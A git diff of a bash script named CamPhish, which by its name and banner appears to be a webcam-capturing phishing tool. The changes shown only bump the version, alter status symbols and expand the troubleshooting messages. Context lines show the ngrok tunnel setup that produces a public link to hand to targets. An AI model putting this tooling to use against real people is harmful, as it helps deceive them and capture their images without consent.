@@ -1,5 +1,5 @@
 #!/bin/bash
-# CamPhish v1.1
+# CamPhish v1.4
 # Powered by TechChip
 # Credits goes to thelinuxchoice [github.com/thelinuxchoice/]
 
@@ -15,7 +15,7 @@ printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | 
 printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
 printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
-printf " \e[1;93m CamPhish Ver 1.1 \e[0m \n"
+printf " \e[1;93m CamPhish Ver 1.4 \e[0m \n"
 printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
 
 printf "\n"
@@ -198,13 +198,13 @@ fi
 fi
 fi
 if [[ -e ~/.ngrok2/ngrok.yml ]]; then
-printf "\e[1;93m[\e[0m!\e[1;93m] your ngrok "
+printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
 cat  ~/.ngrok2/ngrok.yml
 read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
 if [[ $chg_token == "Y" || $chg_token == "y" || $cchg_token == "Yes" || $cchg_token == "yes" ]]; then
 read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
 ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-printf "\e[1;92m[\e[0m!\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
 fi
 else
 read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
@@ -219,7 +219,11 @@ sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
 if [[ -z "$link" ]]; then
-printf "\e[1;31m[!] Direct link is not generating, check your ngrok authtoken  \e[0m\n"
+printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
 exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
